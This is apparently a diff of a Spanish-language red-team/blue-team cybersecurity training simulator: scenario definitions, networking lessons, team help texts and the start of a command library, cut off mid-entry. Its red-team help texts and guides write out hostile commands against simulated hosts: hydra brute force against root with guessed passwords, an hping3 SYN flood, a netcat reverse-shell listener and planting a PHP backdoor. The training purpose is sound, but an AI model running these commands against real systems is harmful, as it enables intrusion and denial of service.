-                    <li><strong>Zona 1 (Invitados):</strong> <code>192.168.10.0/24</code></li>
-                    <li><strong>Zona 2 (Corporativa):</strong> <code>192.168.20.0/25</code></li>
-                    <li><strong>Zona 3 (Desarrollo):</strong> <code>192.168.20.128/26</code></li>
-                    <li><strong>Zona 4 (Servidores):</strong> <code>192.168.30.0/27</code>
-                        <ul className="ml-6 mt-1 text-sm">
-                            <li><code>192.168.30.10</code> = Servidor Archivos (SMB, 445/TCP)</li>
-                            <li><code>192.168.30.15</code> = Servidor BD (SQL, 1433/TCP)</li>
-                        </ul>
-                    </li>
-                </ul>
-            </CisoCard>
-            <CisoCard icon="target" title="Su Tarea">
-                <p>Definir la matriz de reglas de firewall (ACLs) que controla el tráfico <strong>entre</strong> estas zonas.</p>
-                <h4>Entregables</h4>
-                <ul>
-                    <li><strong>Principio Rector:</strong> ¿Cuál es la <strong>primera</strong> regla que debe existir en cualquier política de firewall entre zonas?</li>
-                    <li><strong>Matriz de ACLs:</strong> Defina qué tráfico está permitido/denegado. (Ej. ¿Zona 2 a Zona 4? ¿Zona 1 a cualquier otra?).</li>
-                    <li><strong>Prueba de Verificación (Kali):</strong> ¿Qué comando usaría desde Zona 1 para <strong>probar</strong> que su bloqueo a Zona 4 es efectivo?</li>
-                </ul>
-            </CisoCard>
-        </div>
-    },
-    {
-        id: 'escenario4', icon: 'brain-circuit', color: 'bg-yellow-500', title: 'Escenario 4: Análisis de DNS, VLSM e Incidentes (Taller 2)',
-        subtitle: 'Tiempo Estimado: 45 minutos',
-        content: <>
-            <CisoCard icon="book-copy" title="Sección 1: Fundamentos Operativos de DNS">
-                <p>Responda las siguientes preguntas basándose en el material de recursos.</p>
-                <ol>
-                    <li><strong>El Gerente de Marketing:</strong> Un gerente le pregunta: "¿Qué es el DNS y por qué Tl habla tanto de él?" Explíquelo en términos sencillos, enfocándose en por qué es crítico para el negocio.</li>
-                    <li><strong>El Arquitecto de Redes:</strong> Un gerente pregunta: "¿Por qué necesito abrir tanto UDP como TCP en el puerto 53? ¿No era DNS solo UDP?" Justifique la necesidad de ambos.</li>
-                    <li><strong>Análisis de Proceso:</strong> Describa la diferencia fundamental entre una consulta DNS recursiva y una iterativa. ¿Cuál inicia su laptop y cuál realiza nuestro resolver interno?</li>
-                </ol>
-            </CisoCard>
-            <CisoCard icon="shield-half" title="Sección 2: Escenarios de Ataque DNS">
-                <ol start={4}>
-                    <li><strong>Escenario (Pharming):</strong> Varios usuarios reportan que al escribir <code>www.nuestro-banco-asociado.com</code>, llegan a un sitio clonado que pide "verificar" su información. ¿Cuál es el ataque más probable? ¿El problema está en la laptop o en un servidor?</li>
-                    <li><strong>Escenario (DDoS):</strong> El NOC reporta que nuestro servidor web está saturado por un volumen masivo de <strong>respuestas</strong> DNS anormalmente grandes. ¿Qué tipo de ataque DDoS es este? ¿Por qué el atacante usaría servidores de terceros?</li>
-                    <li><strong>Mitigación Estratégica:</strong> El material menciona una tecnología con firmas criptográficas para proteger la integridad de las respuestas DNS. ¿Cómo se llama? ¿Cómo habría prevenido el ataque del Escenario 4?</li>
-                </ol>
-            </CisoCard>
-        </>
-    },
-    {
-        id: 'escenario5', icon: 'shield-off', color: 'bg-red-700', title: 'Escenario 5: "El Peor Día" (Recuperación de Control)',
-        subtitle: 'Equipo Azul - Respuesta a Incidentes',
-        content: <>
-            <CisoCard icon="alert-octagon" title='Situación: 10. "El Peor Día"'>
-                <p>Es lunes, 9:00 AM. Clientes reportan que nuestro sitio (<code>www.esit-pasantes.com</code>) es una página de phishing pidiendo tarjetas de crédito. TI confirma que no pueden iniciar sesión en <code>WEB-PROD-01</code>; sus contraseñas de admin y root han sido cambiadas. Han perdido el control.</p>
-            </CisoCard>
-            <CisoCard icon="shield" title="FASE A: CONTENCIÓN (Detener el fraude AHORA)">
-                <p><strong>Menú de Herramientas/Acciones:</strong></p>
-                <ol>
-                    <li><strong>Firewall de Red (ACLs):</strong> Bloquear la IP del servidor <code>WEB-PROD-01</code>.</li>
-                    <li><strong>Consola del Hipervisor (vSphere/Hyper-V):</strong> "Desconectar" la tarjeta de red virtual (vNIC) del servidor.</li>
-                    <li><strong>Registrador de DNS Público:</strong> Cambiar el registro DNS <code>www.esit-pasantes.com</code> para que apunte a una IP de "página en mantenimiento".</li>
-                    <li><strong>Desconectar el Servidor:</strong> Ir al data center y desconectar el cable físico.</li>
-                </ol>
-                 <h4>Su Tarea (A):</h4>
-                 <p>Priorice las acciones del menú. ¿Cuál es la acción MÁS RÁPIDA y EFECTIVA para detener el fraude al cliente? ¿Por qué las otras opciones son peores o más lentas?</p>
-            </CisoCard>
-        </>
-    },
-    {
-        id: 'escenario6', icon: 'swords', color: 'bg-purple-500', title: 'Escenario 6: "El Cazador" (Simulación de Equipo Rojo)',
-        subtitle: 'Equipo Rojo - Pentesting',
-        content: <>
-             <CisoCard icon="user-check" title="Equipo y Misión">
-                <p><strong>Equipo:</strong> Esta tarea es para el equipo de pentesting (Equipo Rojo). El Equipo Azul (resto de pasantes) estará en modo defensivo.</p>
-                <p><strong>Misión:</strong> Su trabajo es causar el incidente del Escenario 5. Comprometer <code>WEB-PROD-01</code> (en sandbox), bloquear a los administradores y suplantar el sitio web.</p>
-            </CisoCard>
-             <CisoCard icon="binoculars" title="FASE 1: RECONOCIMIENTO Y ACCESO INICIAL">
-                <p><strong>Objetivo:</strong> Encontrar una forma de entrar (ej. phishing a un admin).</p>
-                <h4>Su Tarea (Fase 1):</h4>
-                <p>Describan cómo identificarían a su objetivo y qué método de "Acceso Inicial" elegirían.</p>
-            </CisoCard>
-        </>
-    },
-    fortressScenario,
-    rageScenario,
-    killChainScenario,
-    adEscalationScenario,
+        id: 'escenario7',
+        isInteractive: true,
+        icon: 'shield-alert',
+        color: 'bg-red-500',
+        title: 'Escenario 7: Fortaleza Digital',
+        subtitle: 'Defensa y Ataque Básico',
+        description: 'Un servidor web crítico (10.0.10.5) tiene configuraciones por defecto inseguras. El Equipo Rojo debe explotarlas y el Equipo Azul asegurarlas.',
+        difficulty: 'beginner',
+        team: 'both',
+        initialEnvironment: INITIAL_ENV_SCENARIO_7,
+        objectives: [
+            { id: 'red-1', description: 'Realizar reconocimiento de puertos (nmap)', points: 10, required: true, validator: (env) => env.attackProgress.reconnaissance.includes('10.0.10.5') },
+            { id: 'red-2', description: 'Obtener acceso SSH (hydra/ssh)', points: 40, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.10.5') },
+            { id: 'blue-1', description: 'Endurecer SSH (PermitRootLogin no)', points: 30, required: true, validator: (env) => {
+                const host = env.networks.dmz?.hosts[0];
+                const sshConfig = host?.files.find(f => f.path === '/etc/ssh/sshd_config');
+                return !!(sshConfig && sshConfig.content.includes('PermitRootLogin no'));
+            }},
+            { id: 'blue-2', description: 'Activar Firewall (ufw)', points: 20, required: true, validator: (env) => env.networks.dmz.firewall.enabled }
+        ],
+        hints: [
+            { trigger: (env) => !env.attackProgress.reconnaissance.includes('10.0.10.5'), message: "Rojo: Usa 'nmap 10.0.10.5' para descubrir puertos abiertos." },
+            { trigger: (env) => !env.networks.dmz.firewall.enabled, message: "Azul: El firewall está desactivado. Usa 'sudo ufw enable' y revisa el estado." }
+        ],
+        evaluation: () => ({ completed: false, score: 0, feedback: [] })
+    }
 ];
 
-// FIX: Add missing RESOURCE_MODULES export
-export const RESOURCE_MODULES: ResourceModule[] = [
-    {
-        id: 'fundamentos-red',
-        icon: 'book-open',
-        title: 'Fundamentos de Redes (Modelos OSI y TCP/IP)',
-        content: (
-            <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
-                <CisoCard title="El Modelo OSI: La Teoría">
-                    <p>El modelo OSI (Open Systems Interconnection) es un marco conceptual de 7 capas que estandariza las funciones de un sistema de telecomunicaciones o de computación sin tener en cuenta su estructura interna y tecnología subyacentes. Es una guía, no una implementación estricta.</p>
-                    <ol>
-                        <li><b>Capa Física:</b> Transmisión de bits. Cables, conectores, voltajes.</li>
-                        <li><b>Capa de Enlace de Datos:</b> Direccionamiento físico (MAC). Tramas (Frames).</li>
-                        <li><b>Capa de Red:</b> Direccionamiento lógico (IP) y enrutamiento. Paquetes.</li>
-                        <li><b>Capa de Transporte:</b> Conexión extremo a extremo, fiabilidad (TCP) y velocidad (UDP). Segmentos/Datagramas.</li>
-                        <li><b>Capa de Sesión:</b> Gestión de diálogos entre aplicaciones.</li>
-                        <li><b>Capa de Presentación:</b> Formato de datos, cifrado, compresión.</li>
-                        <li><b>Capa de Aplicación:</b> Protocolos de alto nivel (HTTP, FTP, SMTP).</li>
-                    </ol>
-                </CisoCard>
-                <CisoCard title="El Modelo TCP/IP: La Práctica">
-                    <p>El modelo TCP/IP es un modelo más práctico y condensado de 4 capas que es la base de Internet. Se enfoca en la implementación.</p>
-                     <ol>
-                        <li><b>Acceso a Red (Capas 1 y 2 de OSI):</b> Combina las capas Física y de Enlace. Se encarga de cómo los datos se envían físicamente a través de la red.</li>
-                        <li><b>Internet (Capa 3 de OSI):</b> Equivalente a la Capa de Red. Direccionamiento IP y enrutamiento de paquetes.</li>
-                        <li><b>Transporte (Capa 4 de OSI):</b> Equivalente a la Capa de Transporte. Protocolos TCP y UDP.</li>
-                        <li><b>Aplicación (Capas 5, 6 y 7 de OSI):</b> Combina Sesión, Presentación y Aplicación. Protocolos como HTTP, DNS, FTP.</li>
-                    </ol>
-                </CisoCard>
-            </div>
-        )
-    },
-    {
-        id: 'dns-profundo',
-        icon: 'book-search',
-        title: 'Guía Profunda de DNS',
-        content: (
-             <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
-                <CisoCard title="¿Qué es DNS?">
-                    <p>El Sistema de Nombres de Dominio (DNS) es el servicio de directorio de Internet. Los humanos acceden a la información en línea a través de nombres de dominio, como <code>cybervaltorix.com</code>. Los navegadores web interactúan a través de direcciones de Protocolo de Internet (IP). DNS traduce los nombres de dominio a direcciones IP para que los navegadores puedan cargar los recursos de Internet.</p>
-                </CisoCard>
-                 <CisoCard title="Tipos de Consultas DNS">
-                    <ul>
-                        <li><b>Consulta Recursiva:</b> Un cliente DNS (como tu PC) le pide a un servidor DNS (el "resolver") que realice la resolución de nombres completa por él. El resolver hace todo el trabajo y devuelve la respuesta final o un error.</li>
-                        <li><b>Consulta Iterativa:</b> El cliente DNS le pregunta a un servidor, y si este no tiene la respuesta, le devuelve una referencia a otro servidor DNS "más autoritativo" al que preguntar. El cliente debe entonces repetir la consulta a ese nuevo servidor. Este proceso continúa hasta que se encuentra un servidor autoritativo que puede dar la respuesta final.</li>
-                    </ul>
-                </CisoCard>
-                 <CisoCard title="DNS y Seguridad (Vectores de Ataque)">
-                    <ul>
-                        <li><b>Envenenamiento de Caché / Spoofing:</b> Un atacante introduce datos DNS falsos en la caché de un resolver, haciendo que los usuarios sean redirigidos a sitios maliciosos.</li>
-                        <li><b>DNS Tunneling:</b> Usar DNS para exfiltrar datos o para establecer un canal de Comando y Control (C2). Las consultas DNS se disfrazan para llevar cargas útiles maliciosas.</li>
-                        <li><b>Ataques de Amplificación DNS:</b> Un tipo de DDoS donde un atacante envía pequeñas consultas DNS a servidores públicos con una dirección IP de origen falsificada (la de la víctima). Los servidores responden con respuestas mucho más grandes a la víctima, abrumando sus recursos.</li>
-                        <li><b>DNSSEC (Domain Name System Security Extensions):</b> Mitiga el envenenamiento de caché al agregar firmas criptográficas a los registros DNS para verificar su autenticidad.</li>
-                    </ul>
-                </CisoCard>
-            </div>
-        )
-    },
-    {
-        id: 'subnetting-vlsm',
-        icon: 'network',
-        title: 'Subnetting y VLSM',
-        content: (
-            <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
-                <CisoCard title="Subnetting: Dividir para Vencer">
-                    <p>Subnetting es el proceso de tomar una red grande y dividirla en múltiples redes más pequeñas o subredes. Esto se hace para mejorar la seguridad, la organización y el rendimiento de la red, y para conservar las direcciones IP.</p>
-                    <p>La <b>Máscara de Subred</b> (ej. <code>255.255.255.0</code> o <code>/24</code>) es lo que define qué parte de una dirección IP pertenece a la red (NetID) y qué parte al dispositivo (HostID).</p>
-                </CisoCard>
-                 <CisoCard title="VLSM: Máscara de Subred de Longitud Variable">
-                    <p>VLSM es una técnica más eficiente de subnetting. En lugar de dividir una red en subredes del mismo tamaño, VLSM permite crear subredes de diferentes tamaños a partir de la misma red base. Esto es extremadamente útil para minimizar el desperdicio de direcciones IP.</p>
-                    <p><b>Ejemplo Práctico:</b> Tienes el bloque <code>192.168.0.0/24</code> (254 hosts). Necesitas:</p>
-                    <ul>
-                        <li>Una red para 100 PCs.</li>
-                        <li>Una red para 50 PCs.</li>
-                        <li>Una red para 10 servidores.</li>
-                        <li>Enlaces punto a punto de 2 IPs cada uno.</li>
-                    </ul>
-                    <p>Con subnetting tradicional, podrías crear 4 subredes de 62 hosts cada una (<code>/26</code>), desperdiciando muchas IPs. Con VLSM, puedes crear subredes de tamaño preciso (<code>/25</code> para 126 hosts, <code>/26</code> para 62 hosts, <code>/28</code> para 14 hosts, <code>/30</code> para 2 hosts), optimizando el uso del espacio de direccionamiento.</p>
-                </CisoCard>
-            </div>
-        )
-    },
-];
+export const RED_TEAM_HELP_TEXT = `
+<h3 class="text-red-400 font-bold mb-2">Guía Rápida - Equipo Rojo</h3>
+<ul class="list-disc pl-5 space-y-1 text-sm">
+    <li>Tu objetivo es auditar y encontrar vulnerabilidades.</li>
+    <li>Usa <code>nmap</code> para reconocimiento.</li>
+    <li>Usa <code>hydra</code> para probar credenciales débiles.</li>
+    <li>Documenta tus hallazgos.</li>
+</ul>
+`;
 
-// Terminal Help Text
-export const GENERAL_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">Bienvenido a la terminal de simulación.
-Use 'help' para comandos de equipo, o 'help [id_escenario]' para guías.
-Ej: <strong class="text-amber-300">help escenario7</strong>
+export const BLUE_TEAM_HELP_TEXT = `
+<h3 class="text-blue-400 font-bold mb-2">Guía Rápida - Equipo Azul</h3>
+<ul class="list-disc pl-5 space-y-1 text-sm">
+    <li>Tu objetivo es monitorear y asegurar sistemas.</li>
+    <li>Usa <code>journalctl</code> para ver logs de ataques.</li>
+    <li>Usa <code>ufw</code> para bloquear tráfico malicioso.</li>
+    <li>Edita configuraciones inseguras con <code>nano</code>.</li>
+</ul>
+`;
 
-  clear                    - Limpia la pantalla de la terminal.
-  marca                    - Muestra la marca de Cyber Valtorix.
-  exit                     - Cierra una sesión SSH simulada.
-</pre>`;
+export const GENERAL_HELP_TEXT = `
+<div class="mt-4 pt-4 border-t border-slate-700">
+    <p class="text-xs text-slate-500">Use el comando <code>help [escenario]</code> para ayuda específica.</p>
+</div>
+`;
 
-export const RED_TEAM_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">
-<strong class="text-red-400">EQUIPO ROJO - OBJETIVOS Y COMANDOS</strong>
-Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (ej. help escenario8).
-
-<strong>Fase 1: Reconocimiento</strong>
-  <strong class="text-amber-300">nmap [opciones] [host]</strong>    - Escanea puertos y servicios.
-  <strong class="text-amber-300">dirb http://[host]</strong>       - Busca directorios web ocultos.
-  <strong class="text-amber-300">curl http://[host]/[file]</strong> - Intenta leer archivos sensibles.
-  <strong class="text-amber-300">nikto -h http://[host]</strong>   - Escáner de vulnerabilidades web.
-  <strong class="text-amber-300">ping [host]</strong>              - Verifica conectividad.
-
-<strong>Fase 2: Intrusión y Explotación</strong>
-  <strong class="text-amber-300">hydra -l [user] -P [file] ssh://[host]</strong> - Lanza ataque de fuerza bruta. <strong class="text-red-500">(¡RUIDOSO!)</strong>
-  <strong class="text-amber-300">hping3 --flood -S [host]</strong> - Lanza un ataque de denegación de servicio (DoS).
-  <strong class="text-amber-300">john [hash_file]</strong>       - Simula cracking de contraseñas offline.
-  <strong class="text-amber-300">ssh [user]@[host]</strong>      - Intenta acceder con credenciales encontradas.
-  <strong class="text-amber-300">wget [url]</strong>             - (Dentro del host) Descarga un 'payload'.
-  <strong class="text-amber-300">nc -lvnp [port]</strong>        - Crea un listener para reverse shells.
-
-<strong>Fase 3: Post-Explotación</strong>
-  <strong class="text-amber-300">ls -la</strong>                 - Lista archivos y permisos.
-  <strong class="text-amber-300">cat [file]</strong>               - Muestra contenido de un archivo.
-  <strong class="text-amber-300">ps aux</strong>                 - Muestra procesos en ejecución.
-  <strong class="text-amber-300">whoami</strong>                 - Muestra el usuario actual.
-</pre>`;
-
-export const BLUE_TEAM_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">
-<strong class="text-blue-400">EQUIPO AZUL - OBJETIVOS Y COMANDOS</strong>
-Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (ej. help escenario8).
-
-<strong>Fase 1: Conexión y Hardening</strong>
-  <strong class="text-amber-300">ssh blue-team@[host]</strong>     - Conéctese al servidor para asegurarlo.
-  <strong class="text-amber-300">sudo ufw [cmd]</strong>           - Gestiona el firewall (status, enable, allow, deny).
-  <strong class="text-amber-300">sudo nano [file]</strong>         - Simula editar un archivo de configuración.
-  <strong class="text-amber-300">sudo systemctl restart [svc]</strong>- Aplica los cambios a un servicio (ej. sshd).
-  <strong class="text-amber-300">ls -l [file]</strong>             - Lista permisos de archivos.
-  <strong class="text-amber-300">sudo chmod [perm] [file]</strong>   - Cambia permisos de archivos.
-
-<strong>Fase 2: Monitoreo y Detección</strong>
-  <strong class="text-amber-300">top</strong> / <strong class="text-amber-300">htop</strong>               - Muestra la carga del sistema (Detectar DoS).
-  <strong class="text-amber-300">sudo ss -tulnp</strong>               - Muestra servicios escuchando en puertos.
-  <strong class="text-amber-300">grep "Failed" /var/log/auth.log</strong> - Busca intentos de login fallidos.
-  <strong class="text-amber-300">journalctl -u sshd</strong>       - Revisa logs del servicio SSH.
-  <strong class="text-amber-300">tail -f [file]</strong>           - Monitorea logs en tiempo real.
-
-<strong>Fase 3: Respuesta a Incidentes</strong>
-  <strong class="text-amber-300">fail2ban-client banip [ip]</strong> - Simula un baneo manual de IP.
-  <strong class="text-amber-300">sha256sum [file]</strong>           - Verifica la integridad de un archivo.
-</pre>`;
-
-export const SCENARIO_HELP_TEXTS: { [key: string]: { general: string, red: string, blue: string } } = {
-  'escenario7': {
-    general: `<pre class="whitespace-pre-wrap font-mono text-xs">
-<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 7: Fortaleza Digital</strong>
-Este es un ejercicio práctico de ataque y defensa en tiempo real contra <strong class="text-cyan-300">BOVEDA-WEB</strong>.
-</pre>`,
-    blue: `<pre class="whitespace-pre-wrap font-mono text-xs">
-<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - EN TERMINAL 'BOVEDA-WEB'</strong>
-Tu misión es asegurar el servidor ANTES de que el Equipo Rojo encuentre una vulnerabilidad.
-El orden es crítico.
-
-1.  <strong>Activar Firewall (UFW):</strong> Es tu primera línea de defensa.
-    <strong class="text-amber-300">sudo ufw status</strong>      (Verifica que está inactivo)
-    <strong class="text-amber-300">sudo ufw allow 22/tcp</strong>  (¡CRÍTICO! SSH primero o te quedarás fuera)
-    <strong class="text-amber-300">sudo ufw allow 80/tcp</strong>  (HTTP)
-    <strong class="text-amber-300">sudo ufw allow 443/tcp</strong> (HTTPS)
-    <strong class="text-amber-300">sudo ufw enable</strong>        (¡Actívalo!)
-
-2.  <strong>Asegurar SSH:</strong> Deshabilita el login directo de 'root'.
-    <strong class="text-amber-300">sudo nano /etc/ssh/sshd_config</strong>  (Cambia PermitRootLogin a 'no')
-    <strong class="text-amber-300">sudo systemctl restart sshd</strong> (Aplica los cambios)
-
-3.  <strong>Principio de Menor Privilegio:</strong> Protege archivos sensibles.
-    <strong class="text-amber-300">ls -l /var/www/html/db_config.php</strong> (Verás permisos 644 inseguros)
-    <strong class="text-amber-300">sudo chmod 640 /var/www/html/db_config.php</strong>  (Solo dueño/grupo leen)
-
-4.  <strong>Monitoreo Activo:</strong> Caza al Equipo Rojo.
-    <strong class="text-amber-300">tail -f /var/log/auth.log</strong> (Monitoreo en tiempo real de ataques SSH)
-</pre>`,
-    red: `<pre class="whitespace-pre-wrap font-mono text-xs">
-<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
-Tu misión es encontrar una ventana de oportunidad antes de que el Equipo Azul la cierre.
-
-1.  <strong>Reconocimiento:</strong> ¿Qué está abierto?
-    <strong class="text-amber-300">nmap -sV -sC BOVEDA-WEB</strong> (Busca puertos abiertos como 3306 MySQL)
-
-2.  <strong>Enumeración Web:</strong>
-    <strong class="text-amber-300">dirb http://BOVEDA-WEB</strong>     (Busca /backup)
-    <strong class="text-amber-300">curl http://BOVEDA-WEB/backup/db_config.php.bak</strong> (¡Info leak!)
-
-3.  <strong>Ataque de Fuerza Bruta:</strong>
-    <strong class="text-amber-300">hydra -l root -P wordlist.txt ssh://BOVEDA-WEB</strong> (Solo si root login está activo)
-
-4.  <strong>Persistencia:</strong>
-    Si logras entrar: <strong class="text-amber-300">ssh root@BOVEDA-WEB</strong>
-    Modifica el índice: <strong class="text-amber-300">nano /var/www/html/index.php</strong>
-</pre>`
-  },
- 'escenario8': {
-    general: `<pre class="whitespace-pre-wrap font-mono text-xs">
-<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 8: Furia en la Red</strong>
-Ataque combinado contra <strong class="text-cyan-300">PORTAL-WEB</strong>. El trabajo en equipo y la velocidad son claves.
-</pre>`,
-    blue: `<pre class="whitespace-pre-wrap font-mono text-xs">
-<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - EN TERMINAL 'PORTAL-WEB'</strong>
-Estás bajo un doble ataque. Debes diagnosticar y mitigar ambas amenazas.
-
-1.  <strong>Diagnóstico Inicial:</strong> ¿Qué está pasando?
-    <strong class="text-amber-300">top</strong>                 (Verás CPU al 99%. Significa DoS).
-    <strong class="text-amber-300">netstat -an | grep ':80'</strong> (Verifica conexiones masivas).
-    <strong class="text-amber-300">tail -f /var/log/auth.log</strong> (Busca "Failed password". Eso es bruteforce).
-
-2.  <strong>Mitigación Inmediata:</strong> ¡Detén el sangrado!
-    <strong class="text-amber-300">sudo ufw deny from 192.168.1.100</strong> (Bloquea la IP atacante).
-    Esto detendrá AMBOS ataques simultáneamente.
-
-3.  <strong>Análisis Post-Incidente:</strong> ¿Lograron entrar?
-    <strong class="text-amber-300">who</strong> o <strong class="text-amber-300">w</strong> (Revisa usuarios conectados).
-    <strong class="text-amber-300">sha256sum /var/www/html/index.php</strong> (Verifica integridad del archivo).
-</pre>`,
-    red: `<pre class="whitespace-pre-wrap font-mono text-xs">
-<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
-Tu misión es multifacética: distraer, infiltrar y desplegar.
-
-1.  <strong>Fase de Distracción (DoS):</strong> Crea caos.
-    <strong class="text-amber-300">hping3 --flood -S -p 80 PORTAL-WEB</strong> (Satura el servidor. CPU al 100%).
-
-2.  <strong>Fase de Infiltración (Fuerza Bruta):</strong>
-    Mientras el DoS corre (es una distracción), lanza el ataque real:
-    <strong class="text-amber-300">hydra -l admin -P wordlist.txt ssh://PORTAL-WEB</strong>
-
-3.  <strong>Acceso y Persistencia:</strong>
-    Si obtienes la contraseña antes del bloqueo:
-    <strong class="text-amber-300">ssh admin@PORTAL-WEB</strong>
-    Instala backdoor: <strong class="text-amber-300">cat > /var/www/html/shell.php</strong>
-</pre>`
- }
+export const SCENARIO_HELP_TEXTS: { [key: string]: { red: string; blue: string; general: string } } = {
+    'escenario7': { 
+        red: "<p class='mt-2 text-red-300'>Objetivo: Acceder al servidor 10.0.10.5. Prueba si el usuario 'root' tiene una contraseña débil o si el servicio SSH permite login de root.</p>", 
+        blue: "<p class='mt-2 text-blue-300'>Objetivo: Asegurar el servidor 10.0.10.5. Revisa /etc/ssh/sshd_config y asegúrate de que el firewall esté activo.</p>",
+        general: "<p class='text-yellow-200'>Escenario 7: Un servidor mal configurado es un riesgo crítico.</p>"
+    }
 };
 
-export const ALL_COMMANDS = [
-    'help', 'nmap', 'hydra', 'nc', 'msfconsole', 'clear', 'marca', 'exit', 
-    'ssh', 'sudo', 'ufw', 'ls', 'whoami', 'ping', 'dirb', 'curl', 'nikto',
-    'john', 'wget', 'cat', 'ps', 'systemctl', 'chmod', 'nano', 'grep', 'top', 'htop', 'ss',
-    'journalctl', 'openssl', 'fail2ban-client', 'sha256sum', 'hping3', 'tail', 'netstat'
-];
+export const SCENARIO_7_GUIDE = `
+GUÍA EXPERTA - ESCENARIO 7: FORTALEZA DIGITAL
+
+FASE 1: RECONOCIMIENTO (AMBOS EQUIPOS)
+- Rojo: Ejecutar 'nmap 10.0.10.5' para ver puertos. Esperar ver 22 (SSH) y 80 (HTTP).
+- Azul: Ejecutar 'ss -tulnp' en el servidor para ver qué servicios escuchan.
+
+FASE 2: ATAQUE (ROJO)
+- Intentar login SSH manual: 'ssh root@10.0.10.5'.
+- Si falla, usar fuerza bruta: 'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.10.5'.
+- Contraseña probable: 'toor' o 'P@ssw0rd'.
+
+FASE 3: DEFENSA (AZUL)
+- Detectar ataque: 'journalctl -u sshd | grep "Failed password"'.
+- Endurecer SSH:
+  1. 'sudo nano /etc/ssh/sshd_config'
+  2. Cambiar 'PermitRootLogin yes' a 'PermitRootLogin no'.
+  3. Guardar (Ctrl+O, Enter, Ctrl+X).
+  4. Reiniciar servicio: 'sudo systemctl restart sshd'.
+- Activar Firewall:
+  1. 'sudo ufw allow 22/tcp' (¡Importante para no bloquearse!)
+  2. 'sudo ufw enable'
+`;
+
+export const COMMAND_LIBRARY: CommandLibraryData = {
+  "commandLibrary": {
+    "categories": [
+      {
+        "id": "network-recon",
+        "name": "Reconocimiento de Red",
+        "icon": "search",
+        "color": "bg-purple-500",
+        "description": "Herramientas para descubrimiento y mapeo de redes",
+        "commands": [
+          {
+            "name": "nmap",
+            "fullName": "Network Mapper",
+            "description": "Escáner de puertos y servicios de red. La herramienta de reconocimiento más utilizada en pentesting.",
+            "syntax": "nmap [opciones] [objetivo]",
+            "category": "reconnaissance",
+            "team": "red",
+            "examples": [
+              {
+                "command": "nmap 10.0.10.5",
+                "description": "Escaneo básico de puertos comunes"
+              },
+              {
+                "command": "nmap -sV -sC 10.0.10.5",
+                "description": "Detección de versiones y scripts por defecto"
+              },
+              {
+                "command": "nmap -p- -T4 10.0.10.5",
+                "description": "Escaneo de todos los puertos (1-65535) de forma rápida"
+              },
+              {
+                "command": "nmap -sS 10.0.10.0/24",
+                "description": "SYN Stealth scan de toda una subred"
+              },
+              {
+                "command": "nmap -O 10.0.10.5",
+                "description": "Detección de sistema operativo"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-sS", "description": "TCP SYN scan (escaneo sigiloso)" },
+              { "flag": "-sT", "description": "TCP connect scan (completa el handshake)" },
+              { "flag": "-sU", "description": "UDP scan" },
+              { "flag": "-sV", "description": "Detección de versiones de servicios" },
+              { "flag": "-sC", "description": "Ejecuta scripts de Nmap por defecto" },
+              { "flag": "-A", "description": "Escaneo agresivo (OS, versión, scripts, traceroute)" },
+              { "flag": "-p", "description": "Especifica puertos (ej: -p 80,443 o -p-)" },
+              { "flag": "-T0-T5", "description": "Velocidad del escaneo (0=paranoid, 5=insane)" },
+              { "flag": "--script", "description": "Ejecuta scripts NSE específicos" },
+              { "flag": "-Pn", "description": "No hace ping (asume que el host está activo)" },
+              { "flag": "-n", "description": "No resuelve DNS" },
+              { "flag": "-v", "description": "Modo verbose (más información)" }
+            ],
+            "useCases": [
+              "Descubrimiento de servicios vulnerables",
+              "Mapeo de infraestructura de red",
+              "Identificación de sistemas operativos",
+              "Detección de firewalls y filtros"
+            ],
+            "warnings": [
+              "⚠️ El escaneo de redes sin autorización es ilegal",
+              "⚠️ Algunos escaneos pueden ser detectados por IDS/IPS",
+              "⚠️ Los escaneos agresivos pueden causar problemas en sistemas antiguos"
+            ],
+            "defenseCounters": [
+              "Configurar IDS/IPS para detectar escaneos de puertos",
+              "Implementar rate limiting en el firewall",
+              "Cerrar puertos innecesarios y aplicar principio de menor privilegio"
+            ]
+          },
+          {
+            "name": "ping",
+            "fullName": "Packet Internet Groper",
+            "description": "Verifica la conectividad de red enviando paquetes ICMP Echo Request.",
+            "syntax": "ping [opciones] [destino]",
+            "category": "reconnaissance",
+            "team": "both",
+            "examples": [
+              {
+                "command": "ping 10.0.10.5",
+                "description": "Ping continuo hasta interrumpir con Ctrl+C"
+              },
+              {
+                "command": "ping -c 4 10.0.10.5",
+                "description": "Envía solo 4 paquetes ICMP"
+              },
+              {
+                "command": "ping -i 2 10.0.10.5",
+                "description": "Envía pings cada 2 segundos"
+              },
+              {
+                "command": "ping -s 1000 10.0.10.5",
+                "description": "Envía paquetes de 1000 bytes"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-c", "description": "Número de paquetes a enviar" },
+              { "flag": "-i", "description": "Intervalo entre paquetes (segundos)" },
+              { "flag": "-s", "description": "Tamaño del paquete en bytes" },
